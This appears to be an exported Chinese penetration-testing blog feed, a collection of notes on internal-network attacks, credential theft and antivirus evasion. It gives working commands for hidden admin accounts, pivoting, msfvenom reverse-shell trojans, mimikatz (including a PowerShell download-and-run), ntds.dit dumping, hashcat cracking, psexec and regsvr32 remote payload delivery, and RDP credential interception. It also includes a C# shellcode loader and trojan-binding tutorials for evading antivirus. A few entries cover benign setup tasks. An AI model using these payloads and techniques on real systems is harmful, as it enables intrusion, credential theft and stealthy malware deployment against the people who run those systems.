https://www.baidu.com/robots.txt 添加删除用户操作 12net user admin1 P@ssw0rd /add &amp; net localgroup administrators admin1 /add 添加用户并设置管理员net user admin1 /del 内网代理工具EWtools:http://rootkiter.com/EarthWorm正向：被攻击机(跳板)： ./ew_for_Linux -s ssocksd -l 9999 (侦听 0.0.0.0:9999)netstat -pantu|grep 9999 (查看是否侦听成功) 攻击机： proxychain 设置 socks5 为跳板 ip portproxychain nmap 即可以用跳板代理扫描其他主机 netsh Windows 自带工具 windows 端口转发123netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=53 connectaddress=10.10.10.4 connectport=8880netsh interface portproxy show v4tov4netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=53 MSF反弹 shell msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe 1.生成一个回连木马 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.111 LPORT=443 -f dll&gt;/root/Desktop/443.dll 2.生成木马后，我们在菜刀里放入生成的木马，运行，同时打开msf准备回连 use exploit/multi/handler set payload windows/meterpreter/reverse_tcpset LHOST 192.168.2.111set lport 443run 4.提权 background 或 ctrl+z use exploit/windows/local/ms11_080_afdjoinleafset session 1runhashdump //密码获取load mimikatz //使用mimikatzkerberos //查看解密 5.新加路由查看子网 routebackgroundsessionsroute add 192.168.2.0 255.255.255.0 2search mssql //找mssql模块use auxiliary/scanner/mssql/mssql_login //使用login模块 show options set rhosts 192.168.177.1/24 set password sa@123runshow optionsset BEUTEFORCE_SPEED 0run 端口扫描search portscan use auxiliary/scanner/portscan/tcp //使用scanner模块show optionsset RHOSTS 192.168.2.0/24set ports 139,445,3389 //设置扫描端口 ipc$ D:&gt;net use \192.168.1.254\c$ “pwd” /user:user //连接192.168.1.254的IPC$共享，用unc路径D:&gt;copy srv.exe \192.168.1.254\c$ //复制本地 srv.exe 到C根目录D:&gt;net time \192.168.1.254 //查时间D:&gt;at \192.168.1.254 10:50 srv.exe //用at命令在10点50分启动 srv.exeD:&gt;net use \192.168.1.254\c$ /del]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>MSF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hashcat Readme]]></title>
    <url>%2F2019%2F01%2F18%2Fhashcat-readme.html</url>
    <content type="text"><![CDATA[#################################################################&amp; hashcat4.0.1 or 4.1.0 &amp; ################################################################# hash r.txt文件格式 用户名:hash –show 导出已破解的用户名:密码 outr.txt hashcat64.exe -a 3 -m 1000 –show –outfile=C:\Users\hash\Desktop\outr.txt –outfile-format 3 –username c:\Users\hash\Desktop\r.txt –left 导出未破解的用户名:hash leftr.txt hashcat64.exe -a 3 -m 1000 –left –outfile=C:\Users\hash\Desktop\leftr.txt –outfile-format 1 –username c:\Users\hash\Desktop\r.txt 增加密码复杂度命令破解leftr.txt（未破解的用户名:hash） hashcat64.exe -a 3 -m 1000 –outfile=C:\Users\hash\Desktop\outr1.txt –outfile-format 3 –username c:\Users\hash\Desktop\leftr.txt –increment –increment-min=6 –increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a –force 结束以后导出未爆破用户名加hash.txt hashcat64.exe -a 3 -m 1000 –left –outfile=C:\Users\hash\Desktop\leftr2.txt –outfile-format 1 –username c:\Users\hash\Desktop\leftr.txt hashcat64.exe -a 3 -m 1000 –outfile=C:\Users\hash\Desktop\out-1.txt –outfile-format 3 –username c:\Users\hash\Desktop\1.txt –increment –increment-min=6 –increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a –force]]></content>
      <categories>
        <category>密码破解</category>
      </categories>
      <tags>
        <tag>hashcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[抓取 Windows 用户或者域用户 hash 的多种姿势]]></title>
    <url>%2F2018%2F10%2F18%2F%E6%8A%93hash.html</url>
    <content type="text"><![CDATA[抓取 Windows 用户或者域用户 hash 的多种姿势 Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。第二个加密步骤是为了执行密码转储以进行审计，需要两个文件的副本。 执行密码安全审核所需的主要步骤是获取包含信息的文件，从文件中转储密码哈希值，然后使用密码破解程序测试弱密码的这些哈希值。 通过获取Ntds.dit和SYSTEM文件的副本，最可靠的执行密码审计的方法是脱机的。由于Windows阻止这些操作阻止标准读取或复制，因此必须使用特殊技术来获取副本。 使用mimikatz本机测试直接获取内存中的明文密码 mimikatz 只能抓取登陆过的用户hash，无法抓取所有用户,需要免杀 12privilege::debugsekurlsa::logonpasswords 非交互式抓明文密码(webshell中) 1mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" &gt; password.txt powershell加载mimikatz抓取密码 1powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz ProcDump + Mimikatz ==ps:mimikatz的平台（platform）要与进行dump的系统(source dump)兼容(比如目标08的,本地就要用08系统来分析)== 远程主机： 12Procdump.exe -accepteula -ma lsass.exe c:\a.dmp 或者任务管理器找到lsass.exe进程右键创建转储文件 本地主机：mimikatz 12sekurlsa::minidump a.dmpsekurlsa::logonpasswords full ntds.dit 的导出 ntdsutil win2008开始DC中自带的工具交互式12345678ntdsutilsnapshotactivate instance ntdscreatemount [GUID]//copy 完之后再执行unmout [GUID]del [GUID] 非交互1234ntdsutil snapshot "activate instance ntds" create quit quitntdsutil snapshot "mount &#123;GUID&#125;" quit quitcopy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.ditntdsutil snapshot "unmount &#123;GUID&#125;" "delete &#123;GUID&#125;" quit quit QuarkPwDump分析 https://github.com/quarkslab/quarkspwdump 在线提取（直接在目标主机执行，实战中不选择此方式。）1QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit 离线提取 需要两个文件 ntds.dit 和 system.hive ， 其中system.hive可通过reg save hklm\system system.hive获取 1QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hive &gt;c:\hash.txt WINDOWS SERVER 2008-2016123456C:\&gt; ntdsutilntdsutil: activate instance ntdsntdsutil: ifmifm: create full c:\auditifm: quitntdsutil: quit 解出ntds的hash 1NtdsAudit.exe &quot;ntds.dit&quot; -s &quot;SYSTEM&quot; -p pwdump.txt --users-csv users.csv NtdsAudit.exe下载地址 NtdsAudit需要ntds.dit Active Directory数据库，SYSTEM 如果转储密码哈希，则需要注册表配置单元。这些文件由域控制器锁定，因此无法简单地复制和粘贴。从域控制器获取这些文件的推荐方法是使用内置ntdsutil实用程序。 以管理员身份打开命令提示符（cmd.exe）。要以管理员身份打开命令提示符，请单击“启动”。在“开始搜索”中，键入命令提示符。在“开始”菜单的顶部，右键单击“命令提示符”，然后单击“以管理员身份运行”。如果出现“用户帐户控制”对话框，请输入相应的凭据（如果已请求）并确认其显示的操作是您所需的操作，然后单击“继续”。 在命令提示符下，键入以下命令，然后按ENTER键： 1ntdsutil 在ntdsutil提示符下，键入以下命令，然后按Enter： 1activate instance ntds 在ntdsutil提示符下，键入以下命令，然后按Enter： 1ifm 在ifm提示符下，键入以下命令，然后按Enter： 1create full &lt;Drive&gt;:\&lt;Folder&gt; &lt;Drive&gt;:\&lt;Folder&gt; 是要创建的文件的文件夹路径。 例如，以下命令将显示统计信息，输出pwdump.txt包含密码哈希值的文件，并输出users.csv包含每个用户帐户详细信息的文件。 1ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv Linux 明文密码的获取mimipenguin git clone https://github.com/huntergregal/mimipenguin 支持的操作系统 os service supported Ubuntu Desktop 12.04 LTS x64 gnome-keyring-daemon (3.18.3) Y Ubuntu Desktop 16.04 LTS x64 gnome-keyring-daemon (3.18.3) Y Fedora Workstation 25 (x86_64) gnome-keyring-daemon (3.20.0) Y Fedora Workstation 27 (x86_64) gnome-keyring-daemon (3.20.1) Y Kali-rolling x64 gnome-keyring-daemon (3.28.0.2) Y]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows linux 应急响应流程及实战演练]]></title>
    <url>%2F2018%2F10%2F17%2Fwindows%20linux%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.html</url>
    <content type="text"><![CDATA[当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。 windows 应急流程及实战演练 Linux 应急响应流程及实战演练]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建域环境]]></title>
    <url>%2F2018%2F10%2F16%2F%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html</url>
    <content type="text"><![CDATA[域环境搭建 准备： DC: Windows 2008 server R2 DM: Windows 2003 server SP2 Windows 2008 server R2 (域控) 1、修改计算机名： 可以改成DC或者其他什么看着顺眼的名字，默认也行，就是搭建好域以后再改可能会遇到一些问题； 2、配置固定ip: 我虚拟机使用的桥接方式，并且路由器是192.168.3.1，所以在这如此设置，此处的DNS填写本机即，127.0.0.1； 3、服务器管理器—角色：安装Active Directory 域服务并且会同时要求安装DNS服务器； 4、配置域服务:打开服务器管理器或者在运行框下输入 dcpromo直接进行配置，选择新建， Ps：这里可能会因为本地administrator的密码规则不合要求，导致安装失败，改一个强密码； 5、设置林根域： 林就是在多域情况下形成的森林,根表示基础,其他在此根部衍生 具体见：http://angerfire.blog.51cto.com/198455/144123/ 6、域数据存放的地址：默认即可。 DM: Windows 2003 server SP2 1、如果新安装的虚拟机安装时会有选择项是加入域还是组，我这里选择加入域，会让登录当前域的账号密码即“Domaim\administrator”（必须是域账号不是administrator）和对应密码；已有的Windows2003加入域，首先更改组为域选择正确的domain和domain账号密码即可。 2、安装成功后配置静态IP，DNS处填写DC的IP； 3、在2003上执行net time显示如图，说明已经加入域，并且在Windows2008上的domain.com域，控制器上可以看到03的机器； 域已经搭建完成，主域控会生成一个 krbtgt账号，他是Windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份认证。]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过MSF使用SMB端口远程连接目标的技巧]]></title>
    <url>%2F2018%2F10%2F16%2Fmsf%20smb.html</url>
    <content type="text"><![CDATA[前言 内网渗透中获得管理员用户名密码之后，通过SMB端口445来与目标机器的设备建立连接的后渗透技巧。 exploit/windows/smb/psexecmsf &gt; use exploit/windows/smb/psexecmsf exploit(windows/smb/psexec) &gt; set rhost 192.168.2.118msf exploit(windows/smb/psexec) &gt; set smbuser administratormsf exploit(windows/smb/psexec) &gt; set smbpass P@ssw0rdmsf exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(windows/smb/psexec) &gt; set LHOST 192.168.2.145msf exploit(windows/smb/psexec) &gt; set LPORT 4444msf exploit(windows/smb/psexec) &gt; exploit 执行后有一个session回连经实验表明，使用本地账户即使是管理员权限也不能使用此方法得到一个 meterpreter ，只能使用 administrator 的用户名密码才能回来一个 session ；当在域环境使用时，smbuser 不是写成domain/administrator （这样的用户名是Exploit failed 执行不成功的）而是写成 administrator ，并且只要是域管理员都能执行成功并反弹一个 meterpreter 的 session 。 exploit/windows/smb/psexec_pshmsf &gt; use exploit/windows/smb/psexec_pshmsf exploit(windows/smb/psexec_psh) &gt; set rhost 192.168.2.118msf exploit(windows/smb/psexec_psh) &gt; set smbuser administratormsf exploit(windows/smb/psexec_psh) &gt; set smbpass P@ssw0rdmsf exploit(windows/smb/psexec_psh) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(windows/smb/psexec_psh) &gt; set lhost 192.168.2.145msf exploit(windows/smb/psexec_psh) &gt; set lport 4444msf exploit(windows/smb/psexec_psh) &gt; exploit exploit/multi/script/web_delivery使用exploit/multi/script/web_delivery 生成恶意dll代码 12345678910111213141516171819202122msf &gt; use exploit/multi/script/web_delivery msf exploit(multi/script/web_delivery) &gt; show targets Exploit targets: Id Name--- 0 Python 1 PHP 2 PSH 3 Regsvr32 4 PSH (Binary)msf exploit(multi/script/web_delivery) &gt; set target 3msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(multi/script/web_delivery) &gt; set lhost 192.168.2.145msf exploit(multi/script/web_delivery) &gt; set lport 4444msf exploit(multi/script/web_delivery) &gt; exploit [*] Exploit running as background job 0.[*] Started reverse TCP handler on 192.168.2.145:4444 [*] Using URL: http://0.0.0.0:8080/s7sa27EEtl[*] Local IP: http://192.168.2.145:8080/s7sa27EEtl[*] Server started.[*] Run the following command on the target machine:regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dll auxiliary/admin/smb/psexec_command使用 auxiliary/admin/smb/psexec_command 在远程目标上执行命令种恶意 dll 回连 meterpreter ；msf &gt; use auxiliary/admin/smb/psexec_commandmsf auxiliary(admin/smb/psexec_command) &gt; set rhosts 192.168.2.118msf auxiliary(admin/smb/psexec_command) &gt; set smbuser admin1msf auxiliary(admin/smb/psexec_command) &gt; set smbpass P@ssw0rdmsf auxiliary(admin/smb/psexec_command) &gt; set command regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dllmsf auxiliary(admin/smb/psexec_command) &gt; set payload windows/meterpreter/reverse_tcpmsf auxiliary(admin/smb/psexec_command) &gt; set lhost 192.168.2.145msf auxiliary(admin/smb/psexec_command) &gt; set lport 4444msf auxiliary(admin/smb/psexec_command) &gt; exploit 经实验表明，当目标机器有杀毒软件的时候，会拦截其从服务器上下载恶意 dll 文件 s7sa27EEtl.sct （测试机为赛门铁克未授权版），毕竟 msf 的恶意dll 特征码已经被杀毒引擎收录，如果确定目标机其没有杀软便可使用。 auxiliary/scanner/smb/impacket/wmiexecmsf auxiliary(admin/smb/psexec_command) &gt; use auxiliary/scanner/smb/impacket/wmiexecmsf auxiliary(scanner/smb/impacket/wmiexec) &gt; set rhosts 192.168.2.118msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbuser admin1msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbpass P@ssw0rdmsf auxiliary(scanner/smb/impacket/wmiexec) &gt; set command ipconfig /allmsf auxiliary(scanner/smb/impacket/wmiexec) &gt; exploit]]></content>
      <categories>
        <category>MSF</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS 7 安装 Shadowscoks]]></title>
    <url>%2F2018%2F07%2F31%2FCentOS-7-%E5%AE%89%E8%A3%85-shadowscoks.html</url>
    <content type="text"><![CDATA[首先安装 pip ，使用 pip 安装 Shadowsocks 1234yum updateyum upgradeyum install python-pippip install shadowsocks 新建 Shadowsocks 的配置文件 1vim /etc/shadowsocks.json 编辑 Shadowocks 配置文件 12345678910&#123; "server":"0.0.0.0", "server_port":1111, "local_address":"127.0.0.1", "local_port":1080, "password":"yourpassword", "timeout":300, "method":"aes-256-cfb", "fast_open": false&#125; 配置firewall，允许 Shadowsocks 服务端口被外网访问 1234以下命令会永久生效firewall-cmd --zone=public --add-port=1111/tcp --permanent重新载入 firewallfirewall-cmd --reload 启动 ssserver 服务 123ssserver -c /etc/shadowsocks.json -d startssserver -c /etc/shadowsocks.json -d restartssserver -c /etc/shadowsocks.json -d stop]]></content>
      <categories>
        <category>vps，SS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>shadowscoks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS7 使用 Firewalld 打开关闭防火墙与端口]]></title>
    <url>%2F2018%2F07%2F31%2FCentOS7_firewalld.html</url>
    <content type="text"><![CDATA[firewalld的基本使用 12345启动： systemctl start firewalld （service firewalld start）关闭： systemctl stop firewalld （service firewalld stop）查看状态： systemctl status firewalld 开机禁用 ： systemctl disable firewalld开机启用 ： systemctl enable firewalld systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。123456789启动一个服务：systemctl start firewalld.service关闭一个服务：systemctl stop firewalld.service重启一个服务：systemctl restart firewalld.service显示一个服务的状态：systemctl status firewalld.service在开机时启用一个服务：systemctl enable firewalld.service在开机时禁用一个服务：systemctl disable firewalld.service查看服务是否开机启动：systemctl is-enabled firewalld.service查看已启动的服务列表：systemctl list-unit-files|grep enabled查看启动失败的服务列表：systemctl --failed 配置firewalld-cmd12345678910查看版本： firewall-cmd --version查看帮助： firewall-cmd --help显示状态： firewall-cmd --state查看所有打开的端口： firewall-cmd --zone=public --list-ports更新防火墙规则： firewall-cmd --reload查看区域信息: firewall-cmd --get-active-zones查看指定接口所属区域： firewall-cmd --get-zone-of-interface=eth0拒绝所有包：firewall-cmd --panic-on取消拒绝状态： firewall-cmd --panic-off查看是否拒绝： firewall-cmd --query-panic 对一个端口的开启/查看/删除操作1234添加: firewall-cmd --zone=public --add-port=444/tcp --permanent (--permanent永久生效，没有此参数重启后失效)重新载入: firewall-cmd --reload查看: firewall-cmd --zone=public --query-port=444/tcp删除: firewall-cmd --zone=public --remove-port=444/tcp --permanent]]></content>
      <categories>
        <category>Linux命令</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>firewall</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过降级连接劫持RDP明文凭据]]></title>
    <url>%2F2018%2F05%2F03%2Fseth.html</url>
    <content type="text"><![CDATA[Seth是一种用Python和Bash编写的工具，用于通过尝试降级连接以提取明文凭据来进行MitM RDP连接。它的开发目的是为了提高认识，并在笔试，讲习班或会谈的背景下教育正确配置的RDP连接的重要性。作者是Adrian Vollmer（SySS GmbH）。 用法：123456$ ./seth.sh &lt;INTERFACE&gt; &lt;ATTACKER IP&gt; &lt;VICTIM IP&gt; &lt;GATEWAY IP|HOST IP&gt; [&lt;COMMAND&gt;]实例：./seth.sh 网口 攻击者IP 访问RDP IP 被攻击者IP &lt;命令执行一般不用&gt;./seth.sh eth0 192.168.3.149 192.168.3.150 192.168.3.138与上面命令等价（如果所有机器在同一网段可用）：./seth.sh eth0 192.168.3.&#123;149,150,138&#125; 测试： 项目地址：Seth 攻击者机器：kali 192.168.3.149 访问RDP机器：win 7 x64 192.168.3.150 被攻击者机器：win 10 x64 192.168.3.138 欺骗ARP回复 启用IPv4流量转发，将流量从受害主机重定向到攻击者机器，然后再转发到目标RDP服务器。 配置一个iptable规则拒绝SYN数据包，以防止直接的RDP认证。 捕获目标主机的SYN数据包。 克隆SSL证书。重新配置iptables规则，以将流量从受害工作站路由到目标RDP主机。 阻止到端口88的流量，以将Kerberos身份验证降级到NTLM。 seth 执行完的界面： 访问RDP的机器弹出，尝试通过RDP向目标服务器进行身份验证的用户将会收到以下消息： 成功获取被攻击者RDP的用户名密码： 当以下复选框未选中时被攻击者可以直接登录系统，并且seth可以进行键盘记录。 备注： 当我使用win 10 做为访问攻击目标RDP的机器时，win 10 直接报错 ，攻击机器显示类似“请确认加密方式是不是xxx”，不能抓到密码（也可能是我环境的问题）。 使用win 7 做为访问攻击目标RDP的机器，弹出ssl认证那个，未报错，只是进不去mstsc，重新登录即可（攻击机已经断开监听所以可以正常登录）。 使用win 8 做为访问攻击目标RDP的机器，弹出ssl认证那个，报错（但是不影响，点击重新登录即可登录成功）。]]></content>
      <categories>
        <category>内网渗透</category>
        <category>RDP攻击</category>
      </categories>
      <tags>
        <tag>RDP</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TheFatRat YouTube 视频]]></title>
    <url>%2F2018%2F04%2F27%2Fbypass-av.html</url>
    <content type="text"><![CDATA[TheFatRat Screetsec Channel : https://www.youtube.com/channel/UCpK9IXzLMfVFp9NUfDzxFfw Udate thefatrat v1.8 https://youtu.be/6skLV6zPnec?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8 file Pumper in linux with fatrat https://youtu.be/rHuh5DJ476M?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8 Kali linux 2016.2 | Setup FatRat and Bypass Windows 10 :https://www.youtube.com/watch?v=mkfKSCxvPec Embed Backdoor Apk Andoird : https://www.youtube.com/watch?v=bZg3gPuLvgs&amp;feature=youtu.be Create Backdoor Php and Reconnect With TheFatRat : https://www.youtube.com/watch?v=gfS55fjd8Fg THEFATRAT:BACKDOOR CREATOR &amp; BYPASS ANTIVIRUS AND INSTALL. : https://www.youtube.com/watch?v=C4YHVKPw6Zo Exploit Windows 7/8/10 using Thefatrat ( option 2 ) : https://www.youtube.com/watch?v=-WbKOxIl_f4 How to hack android device with FatRat on kali linux 2 :https://www.youtube.com/watch?v=yUuwnu-NUXE Kali Linux Tools - TheFatRat Tool For Generate Backdoor with MsfVenom : https://www.youtube.com/watch?v=7PMfPbrM0o4 FUD 100 % Backdoor With TheFatRat pt.1 [ PwnWinds ][ Bypass Antivirus ] : https://www.youtube.com/watch?v=8lJBwclFwJI FUD 100 % Backdoor With TheFatRat pt.2 [ PwnWinds ][ Bypass Antivirus ] : https://www.youtube.com/watch?v=t7E6DZPhLLk&amp;t=17s FUD 100 % Backdoor With TheFatRat pt.3 [ PwnWinds ][ Bypass Antivirus ] : https://www.youtube.com/watch?v=wCzsD6vt9CQ TheFatrat Backdoor Undetectable by Antivirus Kali linux part 3 :https://www.youtube.com/watch?v=wuOCDn0NvWc 1000 % FUD Backdoor with TheFatRat Tool : https://www.youtube.com/watch?v=vPXWv0jaBEQ How To Use TheFatRat To Create Backdoor In Kali Rolling [FUD 100%] : https://www.youtube.com/watch?v=26tSOuPcpZk Backdoor (Virus) 100% Indetectable | TheFatRat : https://www.youtube.com/watch?v=26tSOuPcpZk Backdooring Android with TheFatRat Tool- Kali Linux Tutorial :https://www.youtube.com/watch?v=1SQW9lujjT8 Hacking Windows using TheFatRat + Apache2 Server + Ettercap + Metasploit on Kali Linux 2016.2 https://www.youtube.com/watch?v=FlXMslSjnGw TheFatRat 1.9.6 - Trodebi ( Embed Trojan into Debian Package ) https://youtu.be/NCsrcqhUBCc?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8 ALL VIDEO IN HERE : https://www.youtube.com/results?search_query=thefatrat+backdoor]]></content>
      <categories>
        <category>bypass-av</category>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>bypass-av</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Veil-Evasion + pyJoiner 捆绑两个 EXE 的免杀木马]]></title>
    <url>%2F2018%2F03%2F09%2Fveil%2BpyJoiner.html</url>
    <content type="text"><![CDATA[0x00 前言最近在学习 veil 的 Veil-Evasion 模块，发现一款能捆绑两个 exe 文件的 pyJoiner 工具，便拿来学习学习。 0x01 在kali linux 2018.1 安装使用 veil 3.1.1 制作回连木马 Veil-Evasion 制作回连木马 12345678910111213141516root@kali:~# veiluse 1 #选择使用 Veil-Evasion 模块Veil-Evasion Menu 41 payloads loadedAvailable Commands: back Go to main Veil menu checkvt Check virustotal against generated hashes clean Remove generated artifacts exit Exit Veil info Information on a specific payload list List available payloads use Use a specific payloadVeil-Evasion command: use 11 #选择payload[cs/meterpreter/rev_tcp&gt;&gt;] set LHOST 192.168.3.149[cs/meterpreter/rev_tcp&gt;&gt;] set LPORT 4444[cs/meterpreter/rev_tcp&gt;&gt;] generate 使用以下命令开启监听： root@kali:~# msfconsole -r /var/lib/veil/output/handlers/test.rc 0x02 配置 pyJoiner—GUI-Version 运行环境GitHub 上有两个版本 项目地址 ，其中 kali 版必须使用 Kali Linux i386 ，我的是 x64 kali ，所以选择了 Windows版本的 pyJoiner—GUI-Version。 本次实验 pyJoiner 运行环境如下： Windows 10 Python 3.6.3 pyinstaller 3.3.1 0x03 将两个exe文件进行捆绑这里捆绑的是 calc.exe 这个程序，将回连木马 test.exe 与其进行捆绑，过程如下： py -3 pyJoiner.py #在 pyJoiner 目录下运行 CMD 执行命令，切记不要关闭CMD 打开 GUI 如下图： 实验中 file1 选择的 calc.exe ，file2 选择的回连木马test.exe， 选择好之后点击 Join 。 捆绑后生成的 exe 路径如下： 0x04 免杀回连测试使用在线查杀引擎 virustotal 的结果如下： 回连测试： 目标机 Windows 10 在目标机双击捆绑后的文件，打开了捆绑的 file1 应用程序计算器 kali 回连 Meteoreter session 12msf exploit(multi/handler) &gt; [*] Sending stage (179779 bytes) to 192.168.3.138[*] Meterpreter session 1 opened (192.168.3.149:4444 -&gt; 192.168.3.138:38099) at 2018-03-06 07:22:08 -0500 参考资料https://www.youtube.com/watch?v=vHz8QU2Dj9M https://github.com/danielhnmoreno/pyJoiner---GUI-Version]]></content>
      <categories>
        <category>内网渗透</category>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>payloads</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali安装pptp和shadowsocks客户端]]></title>
    <url>%2F2018%2F03%2F06%2Fkali%E5%AE%89%E8%A3%85pptp%2Bshadowsocks%E5%AE%A2%E6%88%B7%E7%AB%AF.html</url>
    <content type="text"><![CDATA[kali 安装 pptp 方法依次执行以下命令 123456apt-get install network-manager-openvpn-gnome &amp;&amp; apt-get install network-manager-pptp &amp;&amp; apt-get install network-manager-pptp-gnome &amp;&amp; apt-get install network-manager-strongswan &amp;&amp; apt-get install network-manager-vpnc &amp;&amp; apt-get install network-manager-vpnc-gnome#以上为一条命令来执行cp /etc/network/interfaces /etc/network/interfaces.backup echo &quot;auto lo &quot; &gt; /etc/network/interfaces echo &quot;iface lo inet loopback&quot; &gt;&gt; /etc/network/interfaces /etc/init.d/network-manager restart kali安装ss客户端Command-line Client1234pip install shadowsocksapt-get install shadowsocks-libevcpan Net::Shadowsockssslocal -s 23.154.235.12 -p 8388 -l 1080 -k password -t 600 -m aes-256-cfb 注释：-s 服务器IP，-p为ss配置的端口，-l 本地代理端口，-k为ss配置的密码]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>pptp</tag>
        <tag>ss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[免杀 MSF Windows Payload 的方法与实践（小白视角）]]></title>
    <url>%2F2017%2F12%2F22%2F%E5%85%8D%E6%9D%80%20MSF%20Windows%20Payload%20%E7%9A%84%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E8%B7%B5.html</url>
    <content type="text"><![CDATA[MSF 是当下最流行的渗透测试平台，在进行后渗透阶段往往需要我们绕过杀软等隐蔽操作，在看完余弦猥琐流打发之后，自个手动实践，然后写一个详细的演练操作，做笔记存档。 0x00 制作payload使用 kali 里的 msfvenom 生成一个x86的 Meterpreter Payload 命令如下： 1root@kali:~# msfvenom -p windows/meterpreter/reverse_https -a x86 -f csharp --platform windows -o https.csharp -b "\x00\xff" LHOST=192.168.1.99 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe 大部分参数都不用过多解释了，常用 MSF 的人都知道。需要说明的是，我们要借助于 C# 来执行生成的 Payload，所以格式要选择为 csharp，而最后两个参数（PrependMigrate 和 PrependMigrateProc）是指明 Payload 执行后要将自己注入到一个新创建的宿主 svchost.exe 进程中去。 生成结果 cat https.csharp 如图所示， 0x01 创建 c# 项目我们需要创建一个 C# 项目，我使用的是 Visual Studio 2017。新建一个空白的 C# 的控制台应用(.NET Framework)工程，.Net Framework 版本选择 2.0（保证兼容性）。 将下列代码粘贴覆盖到 Program.cs 中： 123456789101112131415161718192021222324252627282930using System;using System.Threading;using System.Runtime.InteropServices;namespace MSFWrapper&#123; public class Program &#123; public Program() &#123; RunMSF(); &#125; public static void RunMSF() &#123; byte[] MsfPayload = &#123; //Paste your Payload here &#125;; IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40); Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length); CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0); Thread.Sleep(2000); &#125; public static void Main() &#123; &#125; [DllImport(&quot;kernel32.dll&quot;)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(&quot;kernel32.dll&quot;)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); &#125;&#125; 然后将在 kali 生成的 payload 中的十六进制数数组粘贴到代码中注释为“//Paste your Payload here”的下面。 保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”并保存，如图： 增加 Release 版的 x86 编译对象，如图： 然后生成出 MSFWrapper.exe ： 0x02 将生成的 exe 文件转换成 js 文件DotNetToJScript源码下载 开源工具DotNetToJScript详细编译教程 转换命令： F:\WEB渗透工具&gt;DotNetToJScript.exe -l=JScript -o=MSFWrapper.js -c=MSFWrapper.Program MSFWrapper.exe 0x03 通过命令执行 js 文件使其弹回 Meterpreter shell在 kali 里执行命令进行监听： 123456root@kali:~# msfconsole msf &gt; use exploit/multi/handler msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_httpsmsf exploit(multi/handler) &gt; set lhost 192.168.1.99msf 